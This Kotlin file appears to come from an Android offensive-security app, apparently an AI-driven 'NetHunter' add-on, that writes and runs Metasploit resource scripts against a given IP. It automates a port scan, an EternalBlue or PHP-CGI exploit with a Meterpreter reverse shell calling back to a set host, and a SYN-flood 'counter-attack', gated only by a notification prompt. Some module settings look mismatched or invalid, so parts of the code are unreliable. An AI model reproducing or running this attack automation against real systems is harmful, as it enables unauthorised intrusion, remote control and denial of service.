package com.linux_core.core

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.util.Log
import androidx.core.app.NotificationCompat
import java.io.File
import java.util.concurrent.CompletableFuture
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.TimeUnit

object OffensiveEngine {
    private const val TAG = "OffensiveEngine"
    private const val CHANNEL_ID = "offensive_actions"
    private const val TIMEOUT_SECONDS = 30L

    val pendingActions = ConcurrentHashMap<Int, CompletableFuture<Boolean>>()

    enum class AttackStrategy {
        RECON,
        EXPLOIT,
        SPOOF,
        COUNTER,
        RETREAT
    }

    fun execute(context: Context, strategy: AttackStrategy, targetIp: String, targetPort: Int) {
        if (strategy == AttackStrategy.RETREAT) {
            emergencyShutdown()
            return
        }

        val actionId = (System.currentTimeMillis() % Int.MAX_VALUE).toInt()
        val future = CompletableFuture<Boolean>()
        pendingActions[actionId] = future

        showConfirmationNotification(context, actionId, strategy, targetIp, targetPort)

        try {
            val allowed = future.get(TIMEOUT_SECONDS, TimeUnit.SECONDS)
            if (!allowed) {
                Log.i(TAG, "User denied ${strategy.name} against $targetIp:$targetPort")
                return
            }
        } catch (e: Exception) {
            Log.w(TAG, "${strategy.name} against $targetIp:$targetPort timed out or was cancelled")
            pendingActions.remove(actionId)
            return
        }

        val resourceScript = when (strategy) {
            AttackStrategy.RECON -> generateReconScript(targetIp, targetPort)
            AttackStrategy.EXPLOIT -> generateExploitScript(targetIp, targetPort)
            AttackStrategy.COUNTER -> generateCounterScript(targetIp)
            else -> return
        }

        runMsfResource(resourceScript)
    }

    private fun showConfirmationNotification(
        context: Context, actionId: Int, strategy: AttackStrategy,
        targetIp: String, targetPort: Int
    ) {
        createChannel(context)

        val strategyLabel = when (strategy) {
            AttackStrategy.RECON -> "Port scan"
            AttackStrategy.EXPLOIT -> "Attempt exploit"
            AttackStrategy.COUNTER -> "DoS counter-attack"
            else -> strategy.name
        }

        val contentText = "$strategyLabel on $targetIp:$targetPort?"

        val allowIntent = Intent(context, OffensiveActionReceiver::class.java).apply {
            putExtra("action_id", actionId)
            putExtra("allowed", true)
        }
        val denyIntent = Intent(context, OffensiveActionReceiver::class.java).apply {
            putExtra("action_id", actionId)
            putExtra("allowed", false)
        }

        val allowPendingIntent = PendingIntent.getBroadcast(
            context, actionId, allowIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val denyPendingIntent = PendingIntent.getBroadcast(
            context, actionId + 1, denyIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_alert)
            .setContentTitle("NetHunter AI — Offensive Action")
            .setContentText(contentText)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setCategory(NotificationCompat.CATEGORY_ALARM)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .setTimeoutAfter(TimeUnit.SECONDS.toMillis(TIMEOUT_SECONDS))
            .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Deny", denyPendingIntent)
            .addAction(android.R.drawable.ic_menu_compass, "Allow", allowPendingIntent)
            .setAutoCancel(true)
            .build()

        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        manager.notify("offensive_action", actionId, notification)
    }

    private fun createChannel(context: Context) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Offensive AI Actions",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "User confirmation required for offensive network actions"
                setShowBadge(true)
                enableVibration(true)
            }
            val manager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }
    }

    private fun generateReconScript(ip: String, port: Int): String {
        return """
            use auxiliary/scanner/portscan/tcp
            set RHOSTS $ip
            set PORTS $port
            run
            use auxiliary/scanner/http/title
            set RHOSTS $ip
            run
            exit
        """.trimIndent()
    }

    private fun generateExploitScript(ip: String, port: Int): String {
        val module = when(port) {
            445 -> "exploit/windows/smb/ms17_010_eternalblue"
            80, 8080 -> "exploit/multi/http/php_cgi_arg_injection"
            else -> "multi/handler"
        }
        return """
            use $module
            set RHOSTS $ip
            set LHOST 10.0.0.2
            set PAYLOAD linux/x64/meterpreter/reverse_tcp
            run -j
            exit
        """.trimIndent()
    }

    private fun generateCounterScript(ip: String): String {
        return """
            use auxiliary/dos/tcp/synflood
            set RHOSTS $ip
            set SHOOTOUT true
            run
        """.trimIndent()
    }

    private fun emergencyShutdown() {
        Log.e(TAG, "DEFENSE FAILED. RETREATING...")
        // Proxy rotation removed — custom IP only
    }

    private fun runMsfResource(scriptContent: String) {
        Thread {
            try {
                val rcFile = File("/sdcard/Download/auto_attack.rc")
                rcFile.writeText(scriptContent)

                val command = "nh -r msfconsole -q -r ${rcFile.absolutePath}"
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", command))
                process.waitFor()
                Log.i(TAG, "Offensive task completed for strategy.")
            } catch (e: Exception) {
                Log.e(TAG, "MSF Execute Error: ${e.message}")
            }
        }.start()
    }
}
